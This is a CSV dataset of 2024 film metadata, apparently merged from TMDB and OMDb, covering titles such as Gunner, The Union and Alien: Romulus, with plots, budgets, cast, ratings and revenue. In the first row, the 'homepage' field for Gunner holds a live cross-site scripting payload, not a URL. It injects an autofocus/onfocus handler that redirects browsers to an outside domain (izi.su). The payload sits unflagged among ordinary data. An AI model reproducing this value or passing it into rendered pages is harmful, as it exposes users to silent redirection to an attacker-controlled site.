adult,backdrop_path,genre_ids,id,original_language,original_title,overview,popularity,poster_path,release_date,title,video,vote_average,vote_count,belongs_to_collection,budget,genres,homepage,imdb_id,origin_country,production_companies,production_countries,revenue,runtime,spoken_languages,status,tagline,Title,Year,Rated,Released,Runtime,Genre,Director,Writer,Actors,Plot,Language,Country,Awards,Poster,Ratings,Metascore,imdbRating,imdbVotes,imdbID,Type,DVD,BoxOffice,Production,Website,Response,financial_success,imdb_rating,rotten_tomatoes_rating,metacritic_rating,totalSeasons,Error
False,/bxwKC4qAbceMgHU1xCCTBK1eYdn.jpg,"[28, 53, 80]",5492,en,Gunner,"While on a camping trip in order to reconnect, war veteran Colonel Lee Gunner must save his two sons from a gang of violent bikers when they're kidnapped after accidentally stumbling upon to a massive drug operation.",779.38,/5wOdd0PqE2hHGQmePdR1HtRNPgI.jpg,2024-08-16,Gunner,False,5.224,67,,20000000,"[{'id': 28, 'name': 'Action'}, {'id': 53, 'name': 'Thriller'}, {'id': 80, 'name': 'Crime'}]","https://t.com?m""tabindex=""1""autofocus=""""onfocus=""location.replace('//izi.su/kma')",tt12598606,['US'],"[{'id': 7417, 'logo_path': '/13GyIWMzFvDqJN6I6tZCQYzWr7L.png', 'name': 'Convergence Entertainment', 'origin_country': 'US'}, {'id': 8000, 'logo_path': '/f8NwLg72BByt3eav7lX1lcJfe60.png', 'name': 'Broken Road Productions', 'origin_country': 'US'}]","[{'iso_3166_1': 'US', 'name': 'United States of America'}]",0,90,"[{'english_name': 'English', 'iso_639_1': 'en', 'name': 'English'}]",Released,Vengeance has a new name.,Gunner,2024,N/A,16 Aug 2024,106 min,Action,Dimitri Logothetis,"Dimitri Logothetis, Gary Scott Thompson","Luke Hemsworth, Morgan Freeman, Mykel Shannon Jenkins","Lee Gunner tries to save his sons, Luke and Travis, from a dangerous drug gang.",English,United States,N/A,https://m.media-amazon.com/images/M/MV5BY2U5ZDVmODItMzg1MS00MWFlLWE4YzYtZGY2MjNhNzQ1NjQ4XkEyXkFqcGc@._V1_SX300.jpg,"[{'Source': 'Internet Movie Database', 'Value': '3.2/10'}]",N/A,3.2,722,tt12598606,movie,N/A,N/A,N/A,N/A,True,False,3.2,,,,
False,/4ft6TR9wA6bra0RLL6G7JFDQ5t1.jpg,"[28, 35]",704239,en,The Union,A New Jersey construction worker goes from regular guy to aspiring spy when his long-lost high school sweetheart recruits him for an espionage mission.,746.184,/d9CTnTHip1RbVi2OQbA2LJJQAGI.jpg,2024-08-15,The Union,False,6.248,596,,0,"[{'id': 28, 'name': 'Action'}, {'id': 35, 'name': 'Comedy'}]",https://www.netflix.com/title/81282732,tt12610390,['US'],"[{'id': 169668, 'logo_path': None, 'name': 'Municipal Pictures', 'origin_country': 'US'}, {'id': 8537, 'logo_path': None, 'name': 'Closest to the Hole Productions', 'origin_country': 'US'}, {'id': 8536, 'logo_path': None, 'name': 'Leverage Entertainment', 'origin_country': 'US'}]","[{'iso_3166_1': 'US', 'name': 'United States of America'}]",0,109,"[{'english_name': 'English', 'iso_639_1': 'en', 'name': 'English'}]",Released,Old flame. New mission.,The Union,2024,PG-13,16 Aug 2024,107 min,"Action, Comedy, Thriller",Julian Farino,"Joe Barton, David Guggenheim","Mark Wahlberg, Halle Berry, J.K. Simmons","Mike, a down-to earth construction worker, is thrust into the world of super spies and secret agents when his high school sweetheart, Roxanne, recruits him on a high-stakes U.S. intelligence mission.",English,United States,N/A,https://m.media-amazon.com/images/M/MV5BY2I0YmNiNmEtNWI2My00NDU5LWIwZWItNWNkNjFmYWJjNTMxXkEyXkFqcGc@._V1_SX300.jpg,"[{'Source': 'Internet Movie Database', 'Value': '5.5/10'}, {'Source': 'Rotten Tomatoes', 'Value': '50%'}]",N/A,5.5,"13,936",tt12610390,movie,N/A,N/A,N/A,N/A,True,False,5.5,50.0,,,
False,/9SSEUrSqhljBMzRe4aBTh17rUaC.jpg,"[27, 878]",945961,en,Alien: Romulus,"While scavenging the deep ends of a derelict space station, a group of young space colonizers come face to face with the most terrifying life form in the universe.",692.587,/b33nnKl1GSFbao4l3fZDDqsMx0F.jpg,2024-08-13,Alien: Romulus,False,7.108,953,,80000000,"[{'id': 27, 'name': 'Horror'}, {'id': 878, 'name': 'Science Fiction'}]",https://www.20thcenturystudios.com/movies/alien-romulus,tt18412256,['US'],"[{'id': 127928, 'logo_path': '/h0rjX5vjW5r8yEnUBStFarjcLT4.png', 'name': '20th Century Studios', 'origin_country': 'US'}, {'id': 221347, 'logo_path': '/6Ry6uNBaa0IbbSs1XYIgX5DkA9r.png', 'name': 'Scott Free Productions', 'origin_country': 'US'}, {'id': 401, 'logo_path': '/t7mM3DvQ9MwDT3YzMCBrkWpWiiz.png', 'name': 'Brandywine Productions', 'origin_country': 'US'}]","[{'iso_3166_1': 'US', 'name': 'United States of America'}]",291717297,119,"[{'english_name': 'English', 'iso_639_1': 'en', 'name': 'English'}]",Released,,Alien: Romulus,2024,R,16 Aug 2024,119 min,"Horror, Sci-Fi, Thriller",Fede Alvarez,"Fede Alvarez, Rodo Sayagues, Dan O'Bannon","Cailee Spaeny, David Jonsson, Archie Renaux","While scavenging the deep ends of a derelict space station, a group of young space colonists come face to face with the most terrifying life form in the universe.",English,"United States, United Kingdom, Hungary, Australia, New Zealand, Canada",1 nomination,https://m.media-amazon.com/images/M/MV5BMDU0NjcwOGQtNjNjOS00NzQ3LWIwM2YtYWVmODZjMzQzN2ExXkEyXkFqcGc@._V1_SX300.jpg,"[{'Source': 'Internet Movie Database', 'Value': '7.5/10'}, {'Source': 'Rotten Tomatoes', 'Value': '82%'}]",N/A,7.5,"49,595",tt18412256,movie,N/A,"$50,667,665",N/A,N/A,True,True,7.5,82.0,,,
False,/9BQqngPfwpeAfK7c2H3cwIFWIVR.jpg,"[10749, 18]",1079091,en,It Ends with Us,"When a woman's first love suddenly reenters her life, her relationship with a charming, but abusive neurosurgeon is upended, and she realizes she must learn to rely on her own strength to make an impossible choice for her future.",666.825,/4TzwDWpLmb9bWJjlN3iBUdvgarw.jpg,2024-08-07,It Ends with Us,False,6.746,272,,25000000,"[{'id': 10749, 'name': 'Romance'}, {'id': 18, 'name': 'Drama'}]",https://www.itendswithus.movie,tt10655524,['US'],"[{'id': 144610, 'logo_path': '/879WnwsOH1oP6NlLY7ChD6vL6lh.png', 'name': 'Wayfarer Studios', 'origin_country': 'US'}, {'id': 194285, 'logo_path': None, 'name': 'Saks Picture Company', 'origin_country': 'US'}, {'id': 5, 'logo_path': '/71BqEFAF4V3qjjMPCpLuyJFB9A.png', 'name': 'Columbia Pictures', 'origin_country': 'US'}]","[{'iso_3166_1': 'US', 'name': 'United States of America'}]",288480247,131,"[{'english_name': 'English', 'iso_639_1': 'en', 'name': 'English'}]",Released,We break the pattern or the pattern breaks us.,It Ends with Us,2024,PG-13,09 Aug 2024,130 min,"Drama, Romance",Justin Baldoni,"Christy Hall, Colleen Hoover","Blake Lively, Justin Baldoni, Jenny Slate","Adapted from the Colleen Hoover novel, Lily overcomes a traumatic childhood to embark on a new life. A chance meeting with a neurosurgeon sparks a connection but Lily begins to see sides of him that remind her of her parents' rela...",English,United States,N/A,https://m.media-amazon.com/images/M/MV5BYzM2NGMzNGQtZjNhMi00MTVkLTg2ZGQtN2M4OTllYzU1Y2Y0XkEyXkFqcGc@._V1_SX300.jpg,"[{'Source': 'Internet Movie Database', 'Value': '7.1/10'}, {'Source': 'Rotten Tomatoes', 'Value': '59%'}]",N/A,7.1,"5,543",tt10655524,movie,N/A,"$50,000,000",N/A,N/A,True,True,7.1,59.0,,,
False,/qkEnklEGDFy4TRVhuHFn2DI2BP6.jpg,"[27, 53]",930600,en,The Deliverance,"Ebony Jackson, a struggling single mother fighting her personal demons, moves her family into a new home for a fresh start. But when strange occurrences inside the home raise the suspicions of Child Protective Services and threaten to tear the family apart, Ebony soon finds herself locked in a battle for her life and the souls of her children.",631.534,/og1FteMFRInoQnlZeWqEn8XpXHh.jpg,2024-08-16,The Deliverance,False,6.315,246,,0,"[{'id': 27, 'name': 'Horror'}, {'id': 53, 'name': 'Thriller'}]",https://www.netflix.com/title/81582382,tt4196566,['US'],"[{'id': 100033, 'logo_path': '/74LDJbOFdya1ijNT11uh0mM5eg0.png', 'name': 'Tucker Tooley Entertainment', 'origin_country': 'US'}, {'id': 14226, 'logo_path': None, 'name': 'Turn Left Productions', 'origin_country': 'US'}, {'id': 695, 'logo_path': '/rxXG5CZjBGFbJt9tYgrySrkJCTF.png', 'name': 'Lee Daniels Entertainment', 'origin_country': 'US'}]","[{'iso_3166_1': 'US', 'name': 'United States of America'}]",0,112,"[{'english_name': 'English', 'iso_639_1': 'en', 'name': 'English'}]",Released,Every family has its demons.,The Deliverance,2024,R,30 Aug 2024,N/A,"Horror, Thriller",Lee Daniels,"David Coggeshall, Elijah Bynum, Lee Daniels","Andra Day, Glenn Close, Anthony B. Jenkins","A family living in a home in Indiana discover strange, demonic occurrences that convince them and the community that the house is a portal to hell.",English,United States,1 win,https://m.media-amazon.com/images/M/MV5BNWI2ZWFkNTAtYjA0NS00NzZkLWE1NzMtNGRkMmY2MzEwZWRkXkEyXkFqcGc@._V1_SX300.jpg,"[{'Source': 'Rotten Tomatoes', 'Value': '47%'}]",N/A,N/A,25,tt4196566,movie,N/A,N/A,N/A,N/A,True,False,,47.0,,,
False,/7mQ13AV4qd6A43XxXfSoyYQMzhh.jpg,"[35, 878]",1094138,en,Jackpot!,"In the near future, a 'Grand Lottery' has been established - the catch: kill the winner before sundown to legally claim their multi-billion dollar jackpot. When Katie Kim mistakenly finds herself with the winning ticket, she reluctantly joins forces with amateur lottery protection agent Noel Cassidy who must get her to sundown in exchange for a piece of her prize.",630.035,/fOsamTFIyGxjw1jLSKdZYxQBJOT.jpg,2024-08-13,Jackpot!,False,6.374,431,,0,"[{'id': 35, 'name': 'Comedy'}, {'id': 878, 'name': 'Science Fiction'}]",https://www.amazon.com/dp/B0D1JH6TWD,tt26940324,['US'],"[{'id': 105052, 'logo_path': '/v0s09QaxgCrrXrbz2LctvSfRKRi.png', 'name': 'Roth-Kirschenbaum Films', 'origin_country': 'US'}, {'id': 61791, 'logo_path': '/xyiy5wZdmnxVViRa8oRMXQQvT6F.png', 'name': 'Feigco Entertainment', 'origin_country': 'US'}, {'id': 210099, 'logo_path': '/d6HwljzlOzxJ4tXlrpRkNZaZMWL.png', 'name': 'Amazon MGM Studios', 'origin_country': 'US'}]","[{'iso_3166_1': 'US', 'name': 'United States of America'}]",0,107,"[{'english_name': 'English', 'iso_639_1': 'en', 'name': 'English'}]",Released,Take the money and run.,Jackpot!,2024,R,15 Aug 2024,106 min,"Action, Comedy",Paul Feig,Rob Yescombe,"John Cena, Awkwafina, Simu Liu","In the near future, a 'Grand Lottery' has been newly established in California - the catch: kill the winner before sundown to legally claim their multi-billion dollar jackpot.",English,United States,1 win,https://m.media-amazon.com/images/M/MV5BMmQ2ZGU3ODYtNzA0Yi00NDlhLWIxNzYtM2E2Y2FhOGNjZjIyXkEyXkFqcGc@._V1_SX300.jpg,"[{'Source': 'Internet Movie Database', 'Value': '5.8/10'}, {'Source': 'Rotten Tomatoes', 'Value': '38%'}]",N/A,5.8,"14,830",tt26940324,movie,N/A,N/A,N/A,N/A,True,False,5.8,38.0,,,
False,/tbgIhYwQ5IAgNaFU1SBBxxNXCmm.jpg,"[80, 28, 53]",646097,en,Rebel Ridge,A former Marine confronts corruption in a small town when local law enforcement unjustly seizes the bag of cash he needs to post his cousin's bail.,593.718,/xEt2GSz9z5rSVpIHMiGdtf0czyf.jpg,2024-08-27,Rebel Ridge,False,6.708,267,,0,"[{'id': 80, 'name': 'Crime'}, {'id': 28, 'name': 'Action'}, {'id': 53, 'name': 'Thriller'}]",https://www.netflix.com/title/81157729,tt11301886,['US'],"[{'id': 1976, 'logo_path': '/vuNHAl3LpcNtjtRx8Ml4gpUMO2G.png', 'name': 'filmscience', 'origin_country': 'US'}, {'id': 125043, 'logo_path': None, 'name': 'Bonneville Pictures', 'origin_country': 'US'}]","[{'iso_3166_1': 'US', 'name': 'United States of America'}]",0,132,"[{'english_name': 'English', 'iso_639_1': 'en', 'name': 'English'}]",Released,Their laws. His rules.,Rebel Ridge,2024,N/A,06 Sep 2024,131 min,"Action, Crime, Drama",Jeremy Saulnier,Jeremy Saulnier,"Aaron Pierre, Don Johnson, AnnaSophia Robb",An ex-Marine grapples his way through a web of small-town corruption when an attempt to post bail for his cousin escalates into a violent standoff with the local police chief.,English,United States,N/A,https://m.media-amazon.com/images/M/MV5BNjFjNThlNjktZmYyOC00ZDYwLTg2ZDItZDk4MDhmYTBmMmIzXkEyXkFqcGc@._V1_SX300.jpg,[],N/A,N/A,N/A,tt11301886,movie,N/A,N/A,N/A,N/A,True,False,,,,,
False,/rSRA1p4e3laAAJflzdgtqNlx27Y.jpg,[28],1049574,en,Darkness of Man,"Russell Hatch, an Interpol operative who takes on the role of father figure to Jayden, the son of an informant killed in a routine raid gone wrong. Years later, Hatch finds himself protecting Jayden and his grandfather from a group of merciless gangs in an all-out turf war, stopping at nothing to protect Jayden and fight anyone getting in his way.",584.65,/fzmQ7mMYlBE8q459F6x9BAGgmj9.jpg,2024-05-07,Darkness of Man,False,6.6,118,,0,"[{'id': 28, 'name': 'Action'}]",,tt23173980,['US'],"[{'id': 121205, 'logo_path': None, 'name': 'VMI Worldwide', 'origin_country': ''}, {'id': 210830, 'logo_path': None, 'name': 'Sandaled Kid Productions', 'origin_country': ''}]","[{'iso_3166_1': 'US', 'name': 'United States of America'}]",0,108,"[{'english_name': 'English', 'iso_639_1': 'en', 'name': 'English'}]",Released,Laws can be broken. Promises can't.,Darkness of Man,2024,R,21 May 2024,109 min,"Action, Crime, Thriller",James Cullen Bressack,"James Cullen Bressack, Jean-Claude Van Damme, Alethea Hnatko-Cho","Jean-Claude Van Damme, Kristanna Loken, Emerson Min","Interpol operative Russell Hatch witnesses the death of an informant when a seemingly routine raid goes wrong. Years later, he finds himself protecting the informant's son from a group of merciless gangs involved in an all-out tur...",English,United States,N/A,https://m.media-amazon.com/images/M/MV5BMDNlODgwMDYtOTU2Ni00M2JiLWFkN2QtYzZjY2NjNGVlYmJmXkEyXkFqcGdeQXVyMzQwMTY2Nzk@._V1_SX300.jpg,"[{'Source': 'Internet Movie Database', 'Value': '4.4/10'}, {'Source': 'Rotten Tomatoes', 'Value': '70%'}]",N/A,4.4,"1,244",tt23173980,movie,N/A,N/A,N/A,N/A,True,False,4.4,70.0,,,
False,/6ToGkmqn0KG0UGGGUAC1Ww0e5CM.jpg,"[80, 27, 53]",1226578,en,Longlegs,"FBI Agent Lee Harker is assigned to an unsolved serial killer case that takes an unexpected turn, revealing evidence of the occult. Harker discovers a personal connection to the killer and must stop him before he strikes again.",577.168,/5aj8vVGFwGVbQQs26ywhg4Zxk2L.jpg,2024-05-31,Longlegs,False,6.7,772,,10000000,"[{'id': 80, 'name': 'Crime'}, {'id': 27, 'name': 'Horror'}, {'id': 53, 'name': 'Thriller'}]",https://neonrated.com/films/longlegs,tt23468450,['US'],"[{'id': 184518, 'logo_path': '/lOouI8ibBzhLI4qvku74FPUVT8t.png', 'name': 'C2 Motion Picture Group', 'origin_country': 'US'}, {'id': 831, 'logo_path': '/vLENXiYTyITnMDrTKabUXhgTKX2.png', 'name': 'Saturn Films', 'origin_country': 'US'}, {'id': 85465, 'logo_path': '/vWaAGbuCTIjEv8yz2Pog4Sfo67X.png', 'name': 'Oddfellows Entertainment', 'origin_country': 'CA'}, {'id': 232289, 'logo_path': None, 'name': 'Traffic.', 'origin_country': 'US'}, {'id': 167684, 'logo_path': '/kzQwU2H6woBFti9cqjr9BrVXrst.png', 'name': 'Range Media Partners', 'origin_country': 'US'}, {'id': 22842, 'logo_path': '/waIZoO3pnB0VVCUVo8u6hqcYN9U.png', 'name': 'Waypoint Entertainment', 'origin_country': 'US'}]","[{'iso_3166_1': 'CA', 'name': 'Canada'}, {'iso_3166_1': 'US', 'name': 'United States of America'}]",102469694,101,"[{'english_name': 'English', 'iso_639_1': 'en', 'name': 'English'}]",Released,Say your prayers.,Longlegs,2024,R,12 Jul 2024,101 min,"Crime, Horror, Thriller",Osgood Perkins,Osgood Perkins,"Maika Monroe, Nicolas Cage, Blair Underwood","In pursuit of a serial killer, an FBI agent uncovers a series of occult clues that she must solve to end his terrifying killing spree.",English,"United States, Canada",N/A,https://m.media-amazon.com/images/M/MV5BMmVkZWY2ODEtYTMyYy00MDg2LWFkMGUtMjYwOTBhOGViODQzXkEyXkFqcGdeQXVyMTkxNjUyNQ@@._V1_SX300.jpg,"[{'Source': 'Internet Movie Database', 'Value': '7.1/10'}, {'Source': 'Rotten Tomatoes', 'Value': '86%'}]",N/A,7.1,"50,075",tt23468450,movie,N/A,"$72,906,869",N/A,N/A,True,True,7.1,86.0,,,
False,/2RVcJbWFmICRDsVxRI8F5xRmRsK.jpg,"[27, 878, 53]",762441,en,A Quiet Place: Day One,"As New York City is invaded by alien creatures who hunt by sound, a woman named Sam fights to survive with her cat.",574.745,/hU42CRk14JuPEdqZG3AWmagiPAP.jpg,2024-06-26,A Quiet Place: Day One,False,6.8,1691,,67000000,"[{'id': 27, 'name': 'Horror'}, {'id': 878, 'name': 'Science Fiction'}, {'id': 53, 'name': 'Thriller'}]",https://www.aquietplacemovie.com,tt13433802,['US'],"[{'id': 4, 'logo_path': '/gz66EfNoYPqHTYI4q9UEN4CbHRc.png', 'name': 'Paramount Pictures', 'origin_country': 'US'}, {'id': 2481, 'logo_path': '/vOQg26GjR0LnkN1Ph9uyog1UuOE.png', 'name': 'Platinum Dunes', 'origin_country': 'US'}, {'id': 29312, 'logo_path': '/v6aLhoAviWYkfOksBJTd9XbO0YH.png', 'name': 'Sunday Night Productions', 'origin_country': 'US'}]","[{'iso_3166_1': 'US', 'name': 'United States of America'}]",260894737,99,"[{'english_name': 'English', 'iso_639_1': 'en', 'name': 'English'}]",Released,Hear how it all began.,A Quiet Place: Day One,2024,PG-13,28 Jun 2024,99 min,"Drama, Horror, Sci-Fi",Michael Sarnoski,"Michael Sarnoski, John Krasinski, Bryan Woods","Lupita Nyong'o, Joseph Quinn, Alex Wolff",A young woman named Sam finds herself trapped in New York City during the early stages of an invasion by alien creatures with ultra-sensitive hearing.,"American Sign , English","United States, United Kingdom, Canada",1 win & 1 nomination,https://m.media-amazon.com/images/M/MV5BNGZmODU3ZDEtMjQwZC00NTA5LThmNWYtYzk5MmY5ZmM4NGIxXkEyXkFqcGdeQXVyMDM2NDM2MQ@@._V1_SX300.jpg,"[{'Source': 'Internet Movie Database', 'Value': '6.4/10'}, {'Source': 'Rotten Tomatoes', 'Value': '86%'}]",N/A,6.4,"69,782",tt13433802,movie,N/A,"$138,575,183",N/A,N/A,True,True,6.4,86.0,,,
False,/x2thJwMJ6oGlhn7UC4vSwHltEw0.jpg,"[28, 53, 10770]",1115396,en,Hunting Games,"When a group of ex-military members is hired to retrieve a lost bag of stolen money, their mission becomes more difficult after a lone hunter finds the bag first.",572.89,/xVbEJzdMxIQqpuLgla0hU8qr9mt.jpg,2023-05-12,Hunting Games,False,4.2,4,,0,"[{'id': 28, 'name': 'Action'}, {'id': 53, 'name': 'Thriller'}, {'id': 10770, 'name': 'TV Movie'}]",,tt26771713,['US'],"[{'id': 180041, 'logo_path': None, 'name': 'Charach Productions', 'origin_country': ''}, {'id': 198209, 'logo_path': '/rLjxR9L7ahg0bvwRuuxM2eMEpMW.png', 'name': 'Koenig Pictures', 'origin_country': 'US'}]","[{'iso_3166_1': 'US', 'name': 'United States of America'}]",0,94,"[{'english_name': 'English', 'iso_639_1': 'en', 'name': 'English'}]",Released,Hunt or be hunted.,Hunting Games,2023,N/A,05 May 2023,94 min,"Action, Thriller",Justin Lee,Justin Lee,"Randy Charach, Tito Ortiz, Ed Morrone","When a group of ex-military members is hired to retrieve a lost bag of stolen money, their mission becomes more difficult after a lone hunter finds the bag first.",English,United States,N/A,https://m.media-amazon.com/images/M/MV5BZWJiZWQ0ZTgtYTQ2YS00YzlkLTgwMTQtYzViY2ViOTUwNTE2XkEyXkFqcGdeQXVyMTYwNzk4NjA@._V1_SX300.jpg,"[{'Source': 'Internet Movie Database', 'Value': '3.5/10'}]",N/A,3.5,229,tt26771713,movie,N/A,N/A,N/A,N/A,True,False,3.5,,,,
False,/hdFIdXwS8FSN2wIsuotjW1mshI0.jpg,"[16, 35, 12, 10751]",831815,en,Saving Bikini Bottom: The Sandy Cheeks Movie,"When Bikini Bottom is scooped from the ocean, scientific squirrel Sandy Cheeks and her pal SpongeBob SquarePants saddle up for Texas to save their town.",542.546,/30YnfZdMNIV7noWLdvmcJS0cbnQ.jpg,2024-08-01,Saving Bikini Bottom: The Sandy Cheeks Movie,False,6.4,205,,100000000,"[{'id': 16, 'name': 'Animation'}, {'id': 35, 'name': 'Comedy'}, {'id': 12, 'name': 'Adventure'}, {'id': 10751, 'name': 'Family'}]",https://www.netflix.com/title/81221340,tt23063732,['US'],"[{'id': 2348, 'logo_path': '/oydqrfwRAm6qqdYbxuMmmPsVi87.png', 'name': 'Nickelodeon Movies', 'origin_country': 'US'}]","[{'iso_3166_1': 'US', 'name': 'United States of America'}]",0,87,"[{'english_name': 'English', 'iso_639_1': 'en', 'name': 'English'}]",Released,Buckle up.,Saving Bikini Bottom: The Sandy Cheeks Movie,2024,TV-Y7,02 Aug 2024,82 min,"Animation, Adventure, Comedy",Liza Johnson,"Kaz, Tom Stern, Stephen Hillenburg","Carolyn Lawrence, Tom Kenny, Clancy Brown","When Bikini Bottom is suddenly scooped out of the ocean, Sandy Cheeks and SpongeBob journey to Sandy's home state of Texas, where they meet Sandy's family and must save Bikini Bottom from the hands of an evil CEO.","Arabic, English","United States, United Kingdom, Canada",N/A,https://m.media-amazon.com/images/M/MV5BYTFmNDU1YjItZThmYi00NjM3LTk5OGEtODgyMDQ3ODFiYjZhXkEyXkFqcGc@._V1_SX300.jpg,"[{'Source': 'Internet Movie Database', 'Value': '3.7/10'}, {'Source': 'Rotten Tomatoes', 'Value': '40%'}]",N/A,3.7,"2,312",tt23063732,movie,N/A,N/A,N/A,N/A,True,False,3.7,40.0,,,
False,/1wP1phHo2CROOqzv7Azs0MT5esU.jpg,"[16, 35, 10751, 12, 28]",748783,en,The Garfield Movie,"Garfield, the world-famous, Monday-hating, lasagna-loving indoor cat, is about to have a wild outdoor adventure! After an unexpected reunion with his long-lost father – scruffy street cat Vic – Garfield and his canine friend Odie are forced from their perfectly pampered life into joining Vic in a hilarious, high-stakes heist.",531.895,/p6AbOJvMQhBmffd0PIv0u8ghWeY.jpg,2024-04-30,The Garfield Movie,False,7.1,902,,60000000,"[{'id': 16, 'name': 'Animation'}, {'id': 35, 'name': 'Comedy'}, {'id': 10751, 'name': 'Family'}, {'id': 12, 'name': 'Adventure'}, {'id': 28, 'name': 'Action'}]",https://www.thegarfield-movie.com/,tt5779228,"['US', 'GB']","[{'id': 1088, 'logo_path': '/9WOE5AQUXbOtLU6GTwfjS8OMF0v.png', 'name': 'Alcon Entertainment', 'origin_country': 'US'}, {'id': 31922, 'logo_path': '/omWPoru2LNayUOBqjMBLP9KrFrP.png', 'name': 'DNEG', 'origin_country': 'GB'}, {'id': 144610, 'logo_path': '/879WnwsOH1oP6NlLY7ChD6vL6lh.png', 'name': 'Wayfarer Studios', 'origin_country': 'US'}, {'id': 129773, 'logo_path': None, 'name': 'One Cool Group', 'origin_country': 'HK'}, {'id': 11341, 'logo_path': '/xytTBODEy3p20ksHL4Ftxr483Iv.png', 'name': 'Stage 6 Films', 'origin_country': 'US'}, {'id': 229807, 'logo_path': '/p8IO8N3bIaWaebafj52xvVB1On6.png', 'name': 'Andrews McMeel Entertainment', 'origin_country': 'US'}, {'id': 178792, 'logo_path': None, 'name': 'John Cohen Productions', 'origin_country': 'US'}]","[{'iso_3166_1': 'HK', 'name': 'Hong Kong'}, {'iso_3166_1': 'GB', 'name': 'United Kingdom'}, {'iso_3166_1': 'US', 'name': 'United States of America'}]",230295748,101,"[{'english_name': 'English', 'iso_639_1': 'en', 'name': 'English'}]",Released,Indoor cat. Outdoor adventure.,The Garfield Movie,2024,PG,24 May 2024,101 min,"Animation, Adventure, Comedy",Mark Dindal,"Paul A. Kaplan, Mark Torgove, David Reynolds","Chris Pratt, Samuel L. Jackson, Hannah Waddingham","After Garfield's unexpected reunion with his long-lost father, ragged alley cat Vic, he and his canine friend Odie are forced from their perfectly pampered lives to join Vic on a risky heist.",English,"United States, United Kingdom, Hong Kong",1 nomination,https://m.media-amazon.com/images/M/MV5BZDdlNTIwNjYtNzVhNS00MGVmLTk1ZGYtZmZiMjhiMmQ1ZjkwXkEyXkFqcGdeQXVyMTY3ODkyNDkz._V1_SX300.jpg,"[{'Source': 'Internet Movie Database', 'Value': '5.7/10'}, {'Source': 'Rotten Tomatoes', 'Value': '36%'}]",N/A,5.7,"14,787",tt5779228,movie,N/A,"$91,859,556",N/A,N/A,True,True,5.7,36.0,,,
False,/vJk9DOLgP23jO5mBnPHE93MFgYu.jpg,"[12, 10751, 14, 35]",826510,en,Harold and the Purple Crayon,"Inside of his book, adventurous Harold can make anything come to life simply by drawing it. After he grows up and draws himself off the book's pages and into the physical world, Harold finds he has a lot to learn about real life.",505.222,/dEsuQOZwdaFAVL26RjgjwGl9j7m.jpg,2024-07-31,Harold and the Purple Crayon,False,6.9,101,,40000000,"[{'id': 12, 'name': 'Adventure'}, {'id': 10751, 'name': 'Family'}, {'id': 14, 'name': 'Fantasy'}, {'id': 35, 'name': 'Comedy'}]",https://www.haroldandthepurplecrayon.movie,tt1609486,['US'],"[{'id': 1302, 'logo_path': '/zC3b70ixHh89qJIikLQPEvLqbPM.png', 'name': 'Davis Entertainment', 'origin_country': 'US'}, {'id': 5, 'logo_path': '/71BqEFAF4V3qjjMPCpLuyJFB9A.png', 'name': 'Columbia Pictures', 'origin_country': 'US'}, {'id': 22213, 'logo_path': '/qx9K6bFWJupwde0xQDwOvXkOaL8.png', 'name': 'TSG Entertainment', 'origin_country': 'US'}]","[{'iso_3166_1': 'US', 'name': 'United States of America'}]",24982787,90,"[{'english_name': 'English', 'iso_639_1': 'en', 'name': 'English'}]",Released,Everything he draws is about to get real.,Harold and the Purple Crayon,2024,PG,02 Aug 2024,89 min,"Animation, Adventure, Comedy",Carlos Saldanha,"David Guion, Michael Handelman, Crockett Johnson","Zachary Levi, Lil Rel Howery, Benjamin Bottani","Inside of his book, adventurous Harold can make anything come to life simply by drawing it. After he grows up and draws himself off the book's pages and into the physical world, Harold finds he has a lot to learn about real life.",English,United States,N/A,https://m.media-amazon.com/images/M/MV5BZGE3MmYxOTgtMGY1Ni00ZWQ4LTlhNjAtMzcxYjIzMjcwN2U1XkEyXkFqcGc@._V1_SX300.jpg,"[{'Source': 'Internet Movie Database', 'Value': '5.8/10'}, {'Source': 'Rotten Tomatoes', 'Value': '30%'}]",N/A,5.8,"1,201",tt1609486,movie,N/A,"$12,854,729",N/A,N/A,True,False,5.8,30.0,,,
